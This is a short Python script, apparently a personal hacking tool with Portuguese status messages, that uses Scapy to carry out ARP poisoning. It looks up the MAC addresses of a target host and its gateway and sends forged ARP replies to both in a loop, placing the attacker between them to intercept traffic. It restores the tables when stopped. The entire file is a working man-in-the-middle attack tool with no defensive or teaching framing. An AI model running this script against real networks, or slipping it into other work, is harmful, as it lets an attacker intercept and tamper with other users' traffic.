
import time
import sys
from scapy.all import ARP, Ether, send, srp, conf

def get_mac(ip, interface):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv[Ether].src
    return None

def spoof(target_ip, host_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    send(packet, verbose=False)

def restore(target_ip, host_ip, target_mac, host_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(packet, count=4, verbose=False)

def start_arp_poison(target_ip, gateway_ip, interface):
    try:
        target_mac = get_mac(target_ip, interface)
        gateway_mac = get_mac(gateway_ip, interface)

        if target_mac is None:
            print(f"[!] Erro: Nao foi possivel obter o MAC do alvo {target_ip}")
            return
        if gateway_mac is None:
            print(f"[!] Erro: Nao foi possivel obter o MAC do roteador {gateway_ip}")
            return

        print(f"[+] MACs encontrados! Alvo: {target_mac} | Roteador: {gateway_mac}")
        print("[*] Envenenando... Pressione CTRL+C para parar.")

        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[*] Restaurando a rede, aguarde...")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        print("[+] Rede restaurada com sucesso.")
